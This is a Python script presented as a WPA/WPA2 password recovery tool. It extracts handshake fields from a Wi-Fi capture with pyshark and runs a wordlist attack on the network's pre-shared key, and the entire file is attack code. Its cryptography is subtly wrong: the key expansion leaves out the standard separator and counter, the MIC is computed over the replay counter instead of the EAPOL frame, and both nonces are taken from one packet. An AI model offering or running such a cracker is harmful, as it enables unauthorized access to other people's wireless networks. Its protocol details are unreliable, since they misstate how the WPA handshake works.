import argparse
import pyshark
import hashlib
import hmac
import binascii
from passlib.utils.pbkdf2 import pbkdf2

def extract_handshake(pcap_file):
    """
    Extracts SSID, ANonce, SNonce, MIC, AP MAC, and Client MAC from a .cap file.
    """
    cap = pyshark.FileCapture(pcap_file)
    
    ssid = None
    ap_mac, client_mac = None, None
    anonce, snonce, mic = None, None, None
    key_replay_counter = None

    for pkt in cap:
        if hasattr(pkt, "wlan_mgt") and hasattr(pkt.wlan_mgt, "ssid"):
            ssid = pkt.wlan_mgt.ssid

        if hasattr(pkt, "eapol"):
            eapol_layer = pkt.eapol

            if int(eapol_layer.key_info, 16) & 0x0080:  # Check if message contains MIC
                ap_mac = pkt.wlan.bssid
                client_mac = pkt.wlan.sa
                anonce = eapol_layer.key_nonce
                snonce = getattr(eapol_layer, "wlan_mgt.wpa_key_nonce", None)
                mic = eapol_layer.key_mic
                key_replay_counter = eapol_layer.key_replay_counter
                break

    cap.close()

    if not (ssid and anonce and snonce and mic and ap_mac and client_mac):
        print("[!] Incomplete handshake found.")
        return None

    return {
        "ssid": ssid,
        "ap_mac": ap_mac,
        "client_mac": client_mac,
        "anonce": anonce,
        "snonce": snonce,
        "mic": mic,
        "replay_counter": key_replay_counter
    }

def derive_pmk(psk, ssid):
    """
    Derives the PMK using PBKDF2-HMAC-SHA1.
    """
    pmk = pbkdf2(psk, ssid.encode(), 4096, 32, hashlib.sha1)
    return pmk

def derive_ptk(pmk, ap_mac, client_mac, anonce, snonce):
    """
    Derives the Pairwise Transient Key (PTK).
    """
    a = b"Pairwise key expansion"
    b_data = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(anonce, snonce) + max(anonce, snonce)

    return hmac.new(pmk, a + b_data, hashlib.sha1).digest()[:16]  # Use first 16 bytes

def validate_pmk(pmk, handshake_data):
    """
    Validates the PMK by deriving the PTK and checking MIC.
    """
    ptk = derive_ptk(
        pmk,
        binascii.unhexlify(handshake_data["ap_mac"].replace(":", "")),
        binascii.unhexlify(handshake_data["client_mac"].replace(":", "")),
        binascii.unhexlify(handshake_data["anonce"]),
        binascii.unhexlify(handshake_data["snonce"])
    )

    calculated_mic = hmac.new(ptk, handshake_data["replay_counter"].encode(), hashlib.sha1).digest()[:16]
    
    return binascii.hexlify(calculated_mic).decode() == handshake_data["mic"]

def verify_psk(handshake_data, wordlist):
    """
    Performs a dictionary attack to recover the PSK.
    """
    with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
        for psk in f:
            psk = psk.strip()
            pmk = derive_pmk(psk, handshake_data["ssid"])
            print(f"[*] Trying: {psk}")

            if validate_pmk(pmk, handshake_data):
                print(f"[+] PSK Found: {psk}")
                return psk

    print("[-] Password not found in wordlist.")
    return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WPA/WPA2 Password Recovery Tool")
    parser.add_argument("-c", "--cap", required=True, help="Path to the .cap file")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to the dictionary file")

    args = parser.parse_args()

    handshake_data = extract_handshake(args.cap)
    if handshake_data:
        verify_psk(handshake_data, args.wordlist)
